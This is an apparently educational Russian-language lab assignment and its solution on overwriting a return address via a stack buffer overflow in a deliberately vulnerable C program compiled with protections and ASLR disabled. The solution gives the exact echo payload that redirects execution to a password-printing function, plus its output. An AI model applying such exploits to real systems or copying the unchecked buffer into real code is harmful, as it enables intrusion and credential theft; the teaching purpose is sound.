# Задание 2. Перезапись адреса возврата.

Отключите ASLR следующей командой:

     echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Скомпилируйте [stack-smash.c](./stack-smash.c) вот так (это отключает некоторые механизмы защиты):

     gcc -fno-stack-protector -z execstack -no-pie -g -o stack-smash stack-smash.c

Программа принимает на вход символы, записывает их в стековый буфер и ничего с ними не делает, выводя `Nothing happened`.

Но в ней есть интересная злоумышленнику функция, которая печатает содержимое базы пользователей, в том числе их пароли.

Злоумышленник может воспользоваться тем, что программист не проверяет, насколько много данных прислал злоумышленник и влезут ли они в буфер.

Если же они не влезут, то программа написана так, что начнут перезаписываться… сохранённые `rbp` и адрес возврата.

Злоумышленник может подавать на вход программе любые символы.

Если вам необходимо передать нулевые символы или символы с необычными кодами, вы можете использовать `echo` вот так:

     echo -n -e "\x11\x40\x00\x99" # четыре байта с кодами 11 40 0 и 99 (16-ричными)

## Задание 2

Попробуйте переписать адрес возврата так, чтобы вместо возвращения из `vulnerable` в `main` запустить функцию `print_users`.

Программа может аварийно завершиться, главное – чтобы функция отработала и вывела на экран список пользователей и их паролей.

![task2](https://gitlab.se.ifmo.ru/programming-languages/cse-programming-languages-fall-2023/main/-/raw/master/seminar-7/img/output.png)

Вы не можете переписывать программу, можете только подавать ей на вход разные данные.
Вы **можете** изучать скомпилированный файл с помощью `gdb`, запускать его, смотреть содержимое памяти.
Также можно пользоваться `objdump` или `readelf`, `nm` и любыми иными средствами для узнавания адреса `print_users`.
Не забывайте, что он может меняться после каждой перекомпиляции!

Также не забудьте, что в памяти многобайтовые числа, в том числе адреса, хранятся в соответствии с `Little Endian`.

## Решение

Находим адрес функции `print_users` (`nm` / `objdump` / `gdb`).

     nm -A stack-smash | grep print_users
     stack-smash:0000000000401146 T print_users

У меня это `0x401146`;
Помним о `Little Endian`.

**Буффер**: `buffer[8]` => можем переполнить и положить нужный адрес

**Нужный ввод**:

     echo -n -e "\x1\x2\x3\x4\x5\x6\x7\x8\x00\x00\x00\x00\x00\x00\x00\x00\x46\x11\x40" | ./stack-smash

**Вывод программы**:

```
Users:
Cat: Meowmeow
Skeletor: Nyarr
[1]    91216 done                                        echo -n -e  | 
       91217 illegal hardware instruction (core dumped)  ./a.out
```

Как видно, `print_users` была вызвана.

Задание выполнено! :sparkles:
